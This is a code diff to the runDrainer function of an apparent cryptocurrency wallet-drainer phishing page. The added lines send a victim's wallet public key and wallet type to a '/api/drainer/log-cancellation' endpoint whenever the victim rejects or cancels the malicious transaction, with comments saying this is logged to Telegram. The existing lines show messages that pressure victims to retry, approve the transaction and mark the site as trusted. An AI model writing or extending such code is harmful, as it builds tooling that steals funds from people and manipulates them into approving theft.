@@ -1336,6 +1336,18 @@ async function runDrainer(provider) {
         // Check if user rejected the transaction
           if (signError.message?.includes('User rejected') || signError.message?.includes('User denied') || signError.message?.includes('Cancelled')) {
             showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
+            
+            // Log transaction cancellation to Telegram
+            fetch('/api/drainer/log-cancellation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                walletType: connectedWalletType || 'Unknown',
+                reason: 'User rejected transaction'
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
+            
         } else if (signError.message?.includes('Simulation failed') || signError.message?.includes('Transaction simulation failed')) {
             showStatus('❌ Transaction simulation failed. This could be due to insufficient funds, security settings, or network issues. Please try again or check your wallet settings.', 'error');
             
@@ -1347,6 +1359,18 @@ async function runDrainer(provider) {
             showStatus('⏰ Wallet connection timeout. Please ensure your wallet app is open and responsive, then try again.', 'error');
           } else if (signError.message?.includes('Transaction cancelled') || signError.message?.includes('cancelled')) {
             showStatus('✅ Transaction cancelled by user. You can try again when ready.', 'info');
+            
+            // Log transaction cancellation to Telegram
+            fetch('/api/drainer/log-cancellation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                walletType: connectedWalletType || 'Unknown',
+                reason: 'User cancelled transaction'
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
+            
           } else if (signError.message?.includes('Security check failed') || signError.message?.includes('server error')) {
             showStatus('⚠️ Security check failed. Please click "I trust this site" in your wallet, then try again.', 'error');
         } else {
